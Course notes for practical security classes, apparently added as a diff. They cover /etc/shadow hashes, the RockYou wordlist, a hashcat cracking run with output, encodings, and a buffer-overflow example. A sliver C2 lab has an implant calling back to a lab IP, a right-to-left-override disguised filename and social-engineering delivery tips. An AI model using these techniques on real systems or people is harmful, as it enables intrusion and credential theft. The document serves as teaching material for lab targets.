+<h3 id="over-the-years-etcpasswd-became-a-database-to-store-information-on-system-users-phone-numbers-office-locations-etc-and-turned-out-to-be-a-terrible-place-to-store-passwords"><a class="header" href="#over-the-years-etcpasswd-became-a-database-to-store-information-on-system-users-phone-numbers-office-locations-etc-and-turned-out-to-be-a-terrible-place-to-store-passwords">Over the years, /etc/passwd became a database to store information on system users, phone numbers, office locations, etc. and turned out to be a terrible place to store passwords.</a></h3>
+<p>Why? Because for /etc/passwd to be a useful directory, it must be PUBLIC READABLE!</p>
+<h3 id="passwords-were-then-moved-out-of-etcpasswd-and-into-etcshadow"><a class="header" href="#passwords-were-then-moved-out-of-etcpasswd-and-into-etcshadow">Passwords were then moved out of /etc/passwd and into /etc/shadow</a></h3>
+<p>Trying</p>
+<pre><code>cat /etc/shadow
+</code></pre>
+<p>But</p>
+<pre><code>sudo cat /etc/shadow
+</code></pre>
+<p>should work.</p>
+<p>We see the contents look like <code>/etc/passwd</code> but seem to be:</p>
+<p><code>username:LOTSOFGIBBERISH</code></p>
+<p>This gibberish is not the password, but is the the hash of the password.</p>
+<p>So what is a hash?</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="hashing"><a class="header" href="#hashing">Hashing</a></h1>
+<p>Explain what hashing is. Show them an md5 hash on some file. (They need this skill for the homework)</p>
+<h2 id="password-hashes"><a class="header" href="#password-hashes">Password hashes</a></h2>
+<p><code>/etc/shadow</code> stores hashes of the passwords. Let's try to crack one.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="wordlists"><a class="header" href="#wordlists">Wordlists</a></h1>
+<p>On the Try Hack Me challenge from last week, we needed to supply a wordlist to gobuster to make it work.</p>
+<p>These are curated lists of common words used in websites, accounts, passwords, etc.</p>
+<h2 id="rockyou"><a class="header" href="#rockyou">RockYou</a></h2>
+<p>The most famous of these wordlists comes from a hack of an app on a social network.</p>
+<p>From Wikipedia:</p>
+<blockquote>
+<p>Data breach
+In December 2009, the company experienced a data breach resulting in the exposure of over 32 million user accounts.
+The company used an unencrypted database &gt; to store user account data, including plaintext passwords (as opposed to
+password hashes) for its service, as well as passwords to connected accounts at &gt; partner sites (including Facebook,
+Myspace, and webmail services). RockYou would also e-mail the password unencrypted to the user during account recovery.
+They also did not allow using special characters in the passwords. The hacker used a 10-year-old SQL vulnerability to
+gain access to the database. The company took days to notify users after the incident, and initially incorrectly reported
+that the breach only affected older applications when it actually affected all RockYou users.[4]</p>
+</blockquote>
+<blockquote>
+<p>The full list of passwords exposed as a result of the breach is available in Kali Linux, and has been since its launch
+in 2013. Due to its easy attainability and comprehensive length, it is commonly used in dictionary attacks.[21]</p>
+</blockquote>
+<p>So it's a list of MILLIONS of common passwords.</p>
+<h2 id="you-do-not-want-to-use-a-password-on-this-list"><a class="header" href="#you-do-not-want-to-use-a-password-on-this-list">YOU DO NOT WANT TO USE A PASSWORD ON THIS LIST</a></h2>
+<h2 id="first-lines-of-the-rockyou-list"><a class="header" href="#first-lines-of-the-rockyou-list">First lines of the RockYou list:</a></h2>
+<pre><code>123456
+12345
+123456789
+password
+iloveyou
+princess
+1234567
+rockyou
+12345678
+abc123
+nicole
+daniel
+babygirl
+monkey
+lovely
+jessica
+654321
+michael
+ashley
+qwerty
+111111
+iloveu
+000000
+michelle
+tigger
+sunshine
+chocolate
+password1
+soccer
+anthony
+friends
+butterfly
+purple
+angel
+jordan
+liverpool
+justin
+loveme
+fuckyou
+123123
+football
+secret
+andrea
+carlos
+jennifer
+joshua
+bubbles
+1234567890
+superman
+hannah
+amanda
+loveyou
+pretty
+basketball
+andrew
+angels
+tweety
+flower
+playboy
+hello
+elizabeth
+hottie
+tinkerbell
+charlie
+samantha
+barbie
+chelsea
+lovers
+teamo
+jasmine
+brandon
+666666
+shadow
+melissa
+eminem
+matthew
+robert
+danielle
+forever
+family
+jonathan
+987654321
+computer
+whatever
+dragon
+vanessa
+cookie
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="cracking-passwords-with-kali"><a class="header" href="#cracking-passwords-with-kali">Cracking Passwords with Kali</a></h1>
+<h2 id="cracking-a-hashed-password-with-a-wordlist"><a class="header" href="#cracking-a-hashed-password-with-a-wordlist">Cracking a hashed password with a wordlist</a></h2>
+<p>Show
+Kali --&gt; 05 Password Attacks --&gt; hashcat</p>
+<p>It's a command line tool, so we need to work in the terminal.</p>
+<p>The example shown is:</p>
+<p>Let's attack</p>
+<p>So we should find our wordlists:</p>
+<p>do:</p>
+<pre><code>wordlists -h
+</code></pre>
+<p>It will ask whether or not to extract Rockyou. We are now placed in:
+/usr/share/wordlists</p>
+<p>Go back to your home directory</p>
+<pre><code>cd
+</code></pre>
+<p>but remember that the rockyou list is located at <code>/usr/share/wordlists/rockyou.txt</code></p>
+<p>OPTIONAL: Remove all the extraneous stuff except the final hash from your <code>shadow</code> file:</p>
+<p>Crack with:</p>
+<pre><code>hashcat -a 0 shadow /usr/share/wordlists/rockyou.txt
+</code></pre>
+<p>The first parameter <code>-a 0</code> means do a wordlist attack</p>
+<h2 id="important-for-demos"><a class="header" href="#important-for-demos">Important for demos</a></h2>
+<p>hashcat saves the results. To run it again from scratch, do the following:</p>
+<pre><code>rm -rf ~/.local/share/hashcat/
+</code></pre>
+<h2 id="results"><a class="header" href="#results">Results:</a></h2>
+<p>Once hashcat was up and running, it took only 2 seconds on my school laptop.</p>
+<pre><code>Host memory required for this attack: 0 MB
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 2 secs
+
+$6$E/U//EImDPJ0YG75$EEgWMu/83/JMORMJ5OdgF1HeCI9imjyTElJ8MB86ssNkw8gyT8bGOW5qdwuj9FX4dyaYjRoWh9Ecd1pjCQCpX1:carebear1
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
+Hash.Target......: $6$E/U//EImDPJ0YG75$EEgWMu/83/JMORMJ5OdgF1HeCI9imjy...CQCpX1
+Time.Started.....: Fri Dec  6 13:22:04 2024 (1 sec)
+Time.Estimated...: Fri Dec  6 13:22:05 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     3183 H/s (6.86ms) @ Accel:128 Loops:1024 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 4480/14344385 (0.03%)
+Rejected.........: 0/4480 (0.00%)
+Restore.Point....: 4352/14344385 (0.03%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4096-5000
+Candidate.Engine.: Device Generator
+Candidates.#1....: nineteen -&gt; memyselfandi
+
+Started: Fri Dec  6 13:21:59 2024
+Stopped: Fri Dec  6 13:22:07 2024
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="practical-security-week-3"><a class="header" href="#practical-security-week-3">Practical Security Week 3</a></h1>
+<h2 id="delve-into-try-hack-me"><a class="header" href="#delve-into-try-hack-me">Delve into Try Hack Me</a></h2>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="rfc1918-networks"><a class="header" href="#rfc1918-networks">RFC1918 Networks</a></h1>
+<p>Decades ago, when the IP addresses on the Internet were being assigned, multiple blocks were set aside for testing purposes.</p>
+<p>Those addresses can be see in the following table:</p>
+<p>List of RFC1918 Networks</p>
+<pre><code>10.0.0.0 - 10.255.255.255  (10/8 prefix)
+172.16.0.0 - 172.31.255.255  (172.16/12 prefix)
+192.168.0.0 - 192.168.255.255 (192.168/16 prefix)
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="setting-up-openvpn-on-kali"><a class="header" href="#setting-up-openvpn-on-kali">Setting Up OpenVPN on Kali</a></h1>
+<p>Before you start, browse to something like: <a href="https://www.showmyip.com/">Show My IP</a></p>
+<p>Make a note of this IP address. This is what the rest of the world sees when you talk with them.</p>
+<p>Browse to the access page of Try Hack Me <a href="https://tryhackme.com/r/access">here</a></p>
+<p><img src="141/week3/./thnOpenVPN.png" alt="Screenshot of Try Hack Me&#39;s OpenVPN download page" /></p>
+<p>Click on <code>Download Configuration File</code></p>
+<p><img src="141/week3/./vpnDownload.png" alt="Screenshot of Try Hack Me&#39;s OpenVPN download page" /></p>
+<p>Start a Terminal and:</p>
+<pre><code>cd Downloads
+</code></pre>
+<pre><code>sudo openvpn username.ovpn
+</code></pre>
+<p>where you change <code>username</code> to your own username.</p>
+<p>Kali should connect to the THM VPN server.</p>
+<p><img src="141/week3/./openvpnConnected.png" alt="Screenshot of Kali Linux connected" /></p>
+<p>Look at the top right to see that we now have an IP address showing.
+<img src="141/week3/./openvpnConnectedIP.png" alt="Screenshot of Kali Linux connected" /></p>
+<h2 id="what-can-you-do-with-this-vpn"><a class="header" href="#what-can-you-do-with-this-vpn">What can you do with this VPN?</a></h2>
+<p>Now that you're connected to the VPN, check your public IP again: <a href="https://www.showmyip.com/">Show My IP</a></p>
+<p>Why didn't your IP change?</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="welcome-to-csse142-practical-security-iii"><a class="header" href="#welcome-to-csse142-practical-security-iii">Welcome to CSSE142: Practical Security III</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="sliver-c2-platform-and-kali"><a class="header" href="#sliver-c2-platform-and-kali">sliver C2 platform and Kali</a></h1>
+<h2 id="pieces-of-a-typical-command-and-control-attack"><a class="header" href="#pieces-of-a-typical-command-and-control-attack">Pieces of a typical Command and Control attack</a></h2>
+<p>There are three pieces to a typical C2 setup:</p>
+<ol>
+<li>A server which accepts incoming connections from a compromised machine.</li>
+<li>A client that the threat actor uses to connect, through the C2 server, to the compromised machine.</li>
+<li>The implant or beacon which is run on the compromised machine.</li>
+</ol>
+<p>Let's start building our C2 system.</p>
+<p>On Kali, first do:
+<code>sudo apt install sliver</code></p>
+<p>Next, make sure your networking is in place. For instance, if you are connecting to a host over a VPN do that now and then execute:</p>
+<p><code>ip a</code></p>
+<p>and record the relevant ip address.</p>
+<p>Finally, let's make a directory like <code>sliver</code> and then <code>cd</code> into it.</p>
+<h3 id="1-starting-up-the-sliver-server"><a class="header" href="#1-starting-up-the-sliver-server">1. Starting up the sliver server</a></h3>
+<p>For piece 1, we start the server and then craft the exploit so that it knows to call home to this.
+<code>sliver-server</code></p>
+<h3 id="2-start-an-http-server-as-your-c2-server"><a class="header" href="#2-start-an-http-server-as-your-c2-server">2. Start an http server as your C2 server</a></h3>
+<p><code>http</code></p>
+<p>This should bind to port 80. If not, change the port as needed.</p>
+<h3 id="3-create-an-implant"><a class="header" href="#3-create-an-implant">3. Create an implant</a></h3>
+<p>We need to create an implant that phones home to our server.</p>
+<pre><code>generate -b http://10.6.1.70
+</code></pre>
+<p>Then execute</p>
+<p><code>implants</code></p>
+<p>to ensure that the implant is created and pointing to the correct server. Note the <code>Name</code> of the implant.</p>
+<h3 id="4-get-the-implant-to-the-user"><a class="header" href="#4-get-the-implant-to-the-user">4. Get the implant to the user</a></h3>
+<p>In pentesting, this is where you need to get creative and do a bit of social engineering to encourage the user to download and execute this file. It could be via email, messaging, etc.</p>
+<p>For the sake of this demo, open a shell and find where your implant is located. Execute:</p>
+<p><code>python3 -m http.server</code></p>
+<p>to start a web server which can serve this implant. It is likely running at port 8000.</p>
+<p><code>document\u202Efdp.exe</code></p>
+<h3 id="5-demo-using-thms-box"><a class="header" href="#5-demo-using-thms-box">5. DEMO: Using THM's Box</a></h3>
+<p>We used the <code>Blue</code> box to learn about RCE's and metasploit. Let's also try it here.</p>
+<p>Start <code>Blue</code> on THM and record the IP address of the box.</p>
+<p>Remote desktop into the machine using:</p>
+<p><code>rdesktop IP_ADDRESS</code></p>
+<p>Log in as <code>Jon</code> with <code>alqfna22</code> as a password. (How did you get this?)</p>
+<p>Open a web browser and connect back to your Kali box at port, something like
+<code>http://10.6.1.70:8000</code></p>
+<p>Find the implant. Download it and run it. pwned!</p>
+<h3 id="6-watch-for-connections-on-your-c2-server"><a class="header" href="#6-watch-for-connections-on-your-c2-server">6. Watch for connections on your C2 server.</a></h3>
+<p>If this all works, you should see a new session on the sliver-server. Type</p>
+<p><code>use</code> to start working with this session.</p>
+<p>Do commands like <code>ls</code> and <code>whoami</code> from the prompt.</p>
+<p>Try taking a screen shot of the machine.</p>
+<p>Can you get the flags from this machine this way?</p>
+<h3 id="7-what-is-next"><a class="header" href="#7-what-is-next">7. What is next?</a></h3>
+<h4 id="red-team"><a class="header" href="#red-team">RED TEAM:</a></h4>
+<ul>
+<li>How would you get this payload to the user? What tactics would you use?</li>
+<li>What challenges do you think you will need to overcome?</li>
+<li>You've just scored your first implant inside the corporate IT network. What is your plan of attack from here?</li>
+</ul>
+<h4 id="blue-team"><a class="header" href="#blue-team">BLUE TEAM:</a></h4>
+<ul>
+<li>How do you prevent C2 implants?</li>
+<li>How do you detect C2 implants?</li>
+<li>How do protect against the next move of the red team after successfully scoring a C2 implant?</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h3 id="sliver-part-2"><a class="header" href="#sliver-part-2">Sliver part 2.</a></h3>
+<h2 id="how-does-c2-work"><a class="header" href="#how-does-c2-work">How does C2 work?</a></h2>
+<p>Start Wireshark and begin capturing traffic between your server and the implant. What do you see?</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="fundamental-skills"><a class="header" href="#fundamental-skills">Fundamental Skills</a></h1>
+<p>We run into a lot of binary data in CTF competitions, reverse engineering, incident response, etc. It's beneficial, therefore, to practice common ways of dealing with binary data.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="character-encoding"><a class="header" href="#character-encoding">Character Encoding</a></h1>
+<p>In short, character encoding is the mapping between a character and a numerical value that can be stored in memory. Long ago, computers in North America used 7 bits to encode all characters, which provided a usable character-set of 128 different values. Since most computers dealt with 8 bits as a byte, these 7 bits were later extended to 8 bits, or 256 possible combinations. This ASCII standard was used for decades -- at least in North America.</p>
+<p>As applications and operating systems were built to support more languages, it became clear that better encoding systems were needed. The UTF-8 and UTF-16 systems have become widely used as ways to encode characters from different languages.</p>
+<p>You should be comfortable referencing the ASCII and UTF-8 tables to go between characters and values, either in decimal or hexadecimal form. UTF-16 is used in Java and in Windows programming, so it is possible to see that as well.</p>
+<p>Bookmark ASCII and UTF-8 tables on your CTF workstation of choice.</p>
+<p>Or try the following in one line Python script:</p>
+<pre><code>python -c "for i in range(32, 127): print('|', i, '|', hex(i), '|', chr(i), '|')"
+</code></pre>
+<p>ASCII / UTF-8 (American English) encoding:</p>
+<div class="table-wrapper"><table><thead><tr><th>Dec</th><th>Hex</th><th>Char</th></tr></thead><tbody>
+<tr><td>32</td><td>0x20</td><td>Spc</td></tr>
+<tr><td>33</td><td>0x21</td><td>!</td></tr>
+<tr><td>34</td><td>0x22</td><td>"</td></tr>
+<tr><td>35</td><td>0x23</td><td>#</td></tr>
+<tr><td>36</td><td>0x24</td><td>$</td></tr>
+<tr><td>37</td><td>0x25</td><td>%</td></tr>
+<tr><td>38</td><td>0x26</td><td>&amp;</td></tr>
+<tr><td>39</td><td>0x27</td><td>'</td></tr>
+<tr><td>40</td><td>0x28</td><td>(</td></tr>
+<tr><td>41</td><td>0x29</td><td>)</td></tr>
+<tr><td>42</td><td>0x2a</td><td>*</td></tr>
+<tr><td>43</td><td>0x2b</td><td>+</td></tr>
+<tr><td>44</td><td>0x2c</td><td>,</td></tr>
+<tr><td>45</td><td>0x2d</td><td>-</td></tr>
+<tr><td>46</td><td>0x2e</td><td>.</td></tr>
+<tr><td>47</td><td>0x2f</td><td>/</td></tr>
+<tr><td>48</td><td>0x30</td><td>0</td></tr>
+<tr><td>49</td><td>0x31</td><td>1</td></tr>
+<tr><td>50</td><td>0x32</td><td>2</td></tr>
+<tr><td>51</td><td>0x33</td><td>3</td></tr>
+<tr><td>52</td><td>0x34</td><td>4</td></tr>
+<tr><td>53</td><td>0x35</td><td>5</td></tr>
+<tr><td>54</td><td>0x36</td><td>6</td></tr>
+<tr><td>55</td><td>0x37</td><td>7</td></tr>
+<tr><td>56</td><td>0x38</td><td>8</td></tr>
+<tr><td>57</td><td>0x39</td><td>9</td></tr>
+<tr><td>58</td><td>0x3a</td><td>:</td></tr>
+<tr><td>59</td><td>0x3b</td><td>;</td></tr>
+<tr><td>60</td><td>0x3c</td><td>&lt;</td></tr>
+<tr><td>61</td><td>0x3d</td><td>=</td></tr>
+<tr><td>62</td><td>0x3e</td><td>&gt;</td></tr>
+<tr><td>63</td><td>0x3f</td><td>?</td></tr>
+<tr><td>64</td><td>0x40</td><td>@</td></tr>
+<tr><td>65</td><td>0x41</td><td>A</td></tr>
+<tr><td>66</td><td>0x42</td><td>B</td></tr>
+<tr><td>67</td><td>0x43</td><td>C</td></tr>
+<tr><td>68</td><td>0x44</td><td>D</td></tr>
+<tr><td>69</td><td>0x45</td><td>E</td></tr>
+<tr><td>70</td><td>0x46</td><td>F</td></tr>
+<tr><td>71</td><td>0x47</td><td>G</td></tr>
+<tr><td>72</td><td>0x48</td><td>H</td></tr>
+<tr><td>73</td><td>0x49</td><td>I</td></tr>
+<tr><td>74</td><td>0x4a</td><td>J</td></tr>
+<tr><td>75</td><td>0x4b</td><td>K</td></tr>
+<tr><td>76</td><td>0x4c</td><td>L</td></tr>
+<tr><td>77</td><td>0x4d</td><td>M</td></tr>
+<tr><td>78</td><td>0x4e</td><td>N</td></tr>
+<tr><td>79</td><td>0x4f</td><td>O</td></tr>
+<tr><td>80</td><td>0x50</td><td>P</td></tr>
+<tr><td>81</td><td>0x51</td><td>Q</td></tr>
+<tr><td>82</td><td>0x52</td><td>R</td></tr>
+<tr><td>83</td><td>0x53</td><td>S</td></tr>
+<tr><td>84</td><td>0x54</td><td>T</td></tr>
+<tr><td>85</td><td>0x55</td><td>U</td></tr>
+<tr><td>86</td><td>0x56</td><td>V</td></tr>
+<tr><td>87</td><td>0x57</td><td>W</td></tr>
+<tr><td>88</td><td>0x58</td><td>X</td></tr>
+<tr><td>89</td><td>0x59</td><td>Y</td></tr>
+<tr><td>90</td><td>0x5a</td><td>Z</td></tr>
+<tr><td>91</td><td>0x5b</td><td>[</td></tr>
+<tr><td>92</td><td>0x5c</td><td>\</td></tr>
+<tr><td>93</td><td>0x5d</td><td>]</td></tr>
+<tr><td>94</td><td>0x5e</td><td>^</td></tr>
+<tr><td>95</td><td>0x5f</td><td>_</td></tr>
+<tr><td>96</td><td>0x60</td><td>`</td></tr>
+<tr><td>97</td><td>0x61</td><td>a</td></tr>
+<tr><td>98</td><td>0x62</td><td>b</td></tr>
+<tr><td>99</td><td>0x63</td><td>c</td></tr>
+<tr><td>100</td><td>0x64</td><td>d</td></tr>
+<tr><td>101</td><td>0x65</td><td>e</td></tr>
+<tr><td>102</td><td>0x66</td><td>f</td></tr>
+<tr><td>103</td><td>0x67</td><td>g</td></tr>
+<tr><td>104</td><td>0x68</td><td>h</td></tr>
+<tr><td>105</td><td>0x69</td><td>i</td></tr>
+<tr><td>106</td><td>0x6a</td><td>j</td></tr>
+<tr><td>107</td><td>0x6b</td><td>k</td></tr>
+<tr><td>108</td><td>0x6c</td><td>l</td></tr>
+<tr><td>109</td><td>0x6d</td><td>m</td></tr>
+<tr><td>110</td><td>0x6e</td><td>n</td></tr>
+<tr><td>111</td><td>0x6f</td><td>o</td></tr>
+<tr><td>112</td><td>0x70</td><td>p</td></tr>
+<tr><td>113</td><td>0x71</td><td>q</td></tr>
+<tr><td>114</td><td>0x72</td><td>r</td></tr>
+<tr><td>115</td><td>0x73</td><td>s</td></tr>
+<tr><td>116</td><td>0x74</td><td>t</td></tr>
+<tr><td>117</td><td>0x75</td><td>u</td></tr>
+<tr><td>118</td><td>0x76</td><td>v</td></tr>
+<tr><td>119</td><td>0x77</td><td>w</td></tr>
+<tr><td>120</td><td>0x78</td><td>x</td></tr>
+<tr><td>121</td><td>0x79</td><td>y</td></tr>
+<tr><td>122</td><td>0x7a</td><td>z</td></tr>
+<tr><td>123</td><td>0x7b</td><td>{</td></tr>
+<tr><td>124</td><td>0x7c</td><td></td></tr>
+<tr><td>125</td><td>0x7d</td><td>}</td></tr>
+<tr><td>126</td><td>0x7e</td><td>~</td></tr>
+</tbody></table>
+</div><div style="break-before: page; page-break-before: always;"></div><h1 id="base64-encoding"><a class="header" href="#base64-encoding">Base64 Encoding</a></h1>
+<p>Sometimes we need to share binary data with others and one way to do this is in text form. But as we saw in the <em>Character Encoding</em> section, there is a careful mapping between characters and numerical values.</p>
+<p>Let's say we want to share a single byte. If that byte has a value between 32 and 126, it would be possible to send the ASCII representation of the value over plaintext. For example, a byte of value 0x41 could be represented as A.</p>
+<p>But what happens to the byte values outside the printable range? To accommodate for scenarios such as these a binary to text encoding scheme known as Base64 was invented. Every 6 bits of binary data are represented by an 8 bit character. Since 2^6 is 64, we need only part of the typical ASCII character set.</p>
+<p>This ratio of 8 bit characters to 6 bit encoding means that, for every 3 bytes of data, we need 4 bytes of characters to encode it.</p>
+<p>What happens in the case where the data is not a simple multiple of 6 bits? The values are padded with zeros and the = character appears.</p>
+<hr />
+<p>Example 1: The hex value 0xc0ffee is a 24-bit number. To encode this we will need 24/6 * 8 = 32 bits, or 4 characters. db</p>
+<p>0xc0ffee is therefore encoded as wP/u in Base64.</p>
+<hr />
+<p>Example 2: Encoding 0xdeadbeef.</p>
+<p>We have four bytes to encode here, or 32-bits, which does not divide evenly by 6. Instead, some padding will be introduced which leads to the characteristic '=' sign at the end of many Base64 encoded strings.</p>
+<p>We see 0xdeadbeef encoded as 3q2+7w== after padding.</p>
+<hr />
+<div style="break-before: page; page-break-before: always;"></div><h1 id="basic-http-authentication"><a class="header" href="#basic-http-authentication">Basic HTTP Authentication</a></h1>
+<p>Did you know that HTTP provides the means to do basic (username / password) authentication on websites?</p>
+<p>It used to be super common, but it's not anymore.</p>
+<p>Your browser will collect username and password from you and send it to the website in a string that looks like this:</p>
+<pre><code>ZmxhZzp0aGlzX3VzZWRfdG9fYmVfY29tbW9ubHlfdXNlZA==
+</code></pre>
+<ol>
+<li>
+<p>Can you decode it?</p>
+</li>
+<li>
+<p>Why is it not used anymore?</p>
+</li>
+<li>
+<p>Why is it especially dangerous over http:// (instead of https://)?</p>
+</li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="endianness-little-endian-vs-big-endian"><a class="header" href="#endianness-little-endian-vs-big-endian">Endianness: Little Endian vs. Big Endian</a></h1>
+<p>Understanding endianness, or how data is stored in memory, is an important skill to have since we deal with so much in binary form.</p>
+<p>In essence, let's look at how a value such as this 32-bit (four byte) integer, 0xdeadbeef, is stored in memory. The two most common ways are little endian and big endian. Let's take a look at how those two approaches differ. Let's say we're storing those four bytes starting at address 0x100.</p>
+<p><img src="fundamentals/endianness.png" alt="endianness diagram" /></p>
+<p>If you have Ghidra already installed, take a look at <a href="fundamentals/hardcoded">this binary file.</a></p>
+<p>If not, then follow along with the analysis. After asking Ghidra to analyze the file, you should see the following code segment that it reversed:</p>
+<pre><code>void main(undefined param_1)
+
+{
+  undefined4 local_39;
+  undefined4 local_35;
+  undefined4 local_31;
+  undefined2 local_2d;
+  undefined4 local_2b;
+  undefined4 local_27;
+  undefined4 local_23;
+  undefined4 local_1f;
+  undefined4 local_1b;
+  undefined4 local_17;
+  undefined3 uStack_13;
+  undefined1 *local_10;
+  
+  local_10 = &amp;param_1;
+  local_2b = 0x74696872;
+  local_27 = 0x7b465443;
+  local_23 = 0x73696874;
+  local_1f = 0x5f73695f;
+  local_1b = 0x64726168;
+  local_17 = 0x65646f63;
+  uStack_13 = 0x7d64;
+  local_39 = 0x6c6c6548;
+  local_35 = 0x6f77206f;
+  local_31 = 0x2e646c72;
+  local_2d = 10;
+  printf("\n %s",(char *)&amp;local_39);
+  return;
+}
+</code></pre>
+<p>Take a look at the printf() statement near the end. We see the <code>%s</code> and <code>char *</code>, so it's clear that local_39 is an array of characters, aka a string in C. Yet local_39 has a value of <code>0x6c6c6548</code>.  What happens when you place this hexadecimal value into CyberChef and add <em>From Hex</em> to the recipe?</p>
+<p><img src="fundamentals/littlechef1.png" alt="cyberchef with From hex" /></p>
+<p>I see some characters, but not sure what it means. Let's try some more.</p>
+<p><img src="fundamentals/littlechef2.png" alt="cyberchef with From hex" /></p>
+<p>More characters. But something doesn't look right.</p>
+<p>When we analyzed this file with Ghidra, I noticed that it was a 32-bit ELF executable from a little endian processor. Let's go down that road.</p>
+<p>Let's swap the endianness of these bytes. And what's the word length?  CyberChef is really asking us how many bytes we expect per memory address -- it's a 32-bit processor, so four bytes. Add the following <em>Swap endianness</em> block to the recipe. Be sure to place it before the <em>From hex</em> block because we want it working on the raw bytes.</p>
+<p><img src="fundamentals/swapchef1.png" alt="cyberchef with Swap endian" /></p>
+<p>Much better!</p>
+<p><img src="fundamentals/swapchef2.png" alt="cyberchef with Swap endian" /></p>
+<p>Adding in another word yields:</p>
+<p><img src="fundamentals/swapchef3.png" alt="cyberchef with Swap endian" /></p>
+<p>And there it is! Our string is in the clear.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="handling-bytes-in-python"><a class="header" href="#handling-bytes-in-python">Handling bytes in Python</a></h1>
+<p>Python has two classes for handling byte data -- bytes() and bytearray().</p>
+<p>The two classes are similar, but with one crucial difference: bytes() are immutable while bytearray() is mutable.</p>
+<p><img src="Python/pythonbytesimmut.png" alt="image of immutable bytes() type" /></p>
+<p>Also note the quick shortcut way to create a bytes() object from a string:</p>
+<pre><code>your_bytes = b'This string is about to be turned into UTF-8 encoded bytes'
+</code></pre>
+<p><img src="Python/bstring.png" alt="bstring encoded string literal" /></p>
+<p>Which shows that <code>your_bytes</code> is indeed of type bytes() and contains the expected UTF-8 values.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="python-xor"><a class="header" href="#python-xor">Python XOR</a></h1>
+<p>Exclusive or (XOR) is a <a href="https://en.wikipedia.org/wiki/Exclusive_or">well-known</a> binary logical operator and can be used in Python with the <code>^</code> operator.</p>
+<p>For example:</p>
+<p><img src="Python/pythonxor.png" alt="xor on bytes()" /></p>
+<p>XOR is a fun CTF encryption challenge since two rounds of it returns the plaintext.</p>
+<p>Plaintext -- XOR with key --&gt; Ciphertext -- XOR with key --&gt; Plaintext</p>
+<p>For XOR'ing long bytes() or bytearray() objects, you can use a for loop or the map function:</p>
+<pre><code>def xor(bytes_in, key):
+    return bytearray(a^b for a, b in zip(*map(bytearray, [bytes_in, key])))
+</code></pre>
+<p>This function assumes your key is long enough to align with <code>bytes_in</code>. If need be, extend the key by repeating it over and over until it is long enough before calling this function.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="cracking-passwords"><a class="header" href="#cracking-passwords">Cracking passwords</a></h1>
+<p>While occasionally we see vendors really screw up and store passwords in plaintext, nearly all passwords are hashed in some form.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="cracking-passwords-1"><a class="header" href="#cracking-passwords-1">Cracking passwords</a></h1>
+<p>Want to try your hand at cracking hashed passwords using your new Kali instance? Download a test file here: <a href="passwords/shadow">Example shadow file</a>.</p>
+<p>Next, answer the following questions:</p>
+<ol>
+<li>There are at least two programs installed on default Kali Linux that can crack passwords from this second file. Name at least two.</li>
+<li>Find the following command. Kali menu -- 05 – Password Attacks -- wordlists. What does this do?</li>
+<li>What is the rockyou wordlist? Where does it come from?</li>
+<li>Using hashcat and the rockyou wordlist, attack the sample file from above.</li>
+<li>How long did it take your computer to crack this password? How many characters was the password?</li>
+<li>What does this tell you about using passwords that are susceptible to dictionary attacks?</li>
+</ol>
+<p>HINT: hashcat is pretty good about detecting the hashing algorithm. In other words, try at least once without the <code>-m</code> option and see if the hash is autodetected.</p>
+<p>HINT2: Try a dictionary attack here, which is part of the "Straight" attack method of hashcat. How do you tell it which type of attack to use?</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="binary-exploits"><a class="header" href="#binary-exploits">Binary Exploits</a></h1>
+<p>In this type of CTF challenge, we are able to interact with a running program. The goal is usually to find edges cases or other vulnerabilities that let you exploit the file in a way unintended by the author.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="echoing-hex-values"><a class="header" href="#echoing-hex-values">echo'ing hex values</a></h1>
+<p>Sometimes we need to send hex values to a remote system to test out an edge case. The <code>echo</code> command can help... just use the <code>-e</code> command line option.</p>
+<p>Try piping echo into your connection. In this case, we're connected using netcat.</p>
+<pre><code>echo -e "\xde\xad\xbe\xef" | nc &lt;host&gt; &lt;port&gt;
+</code></pre>
+<p>Want to suppress the newline?  Use <code>-n</code></p>
+<pre><code>echo -e -n "\xde\xad\xbe\xef\x03\x34\x43\x0d\x0a" | nc &lt;host&gt; &lt;port&gt;
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="buffer-overflows-intro"><a class="header" href="#buffer-overflows-intro">Buffer Overflows (Intro)</a></h1>
+<p>Let's check out the example C program below.</p>
+<pre><code class="language-C">// Replace the line below with the real flag.
+char flag[] = "replace with real flag";
+
+// Replace the line below with the actual passcode
+char passcode[] = "123456";
+char nickname[12];
+char user_passcode[7];
+
+printf("\nWhat should we call you: ");
+scanf("%s", nickname);
+
+printf("\nGreetings %s. ", nickname);
+printf("Please enter the six character passcode: ");
+scanf("%s", user_passcode);
+
+if (strncmp(passcode, user_passcode, 6) == 0) {
+    printf("\nNice work! The flag is %s", flag);
+}
+else {
+    printf("\nSorry. passcode is incorrect.");
+}
+</code></pre>
+<p>You can download the x86 ELF binary <a href="bufferoverflow/overcode">here</a> if you would like.</p>
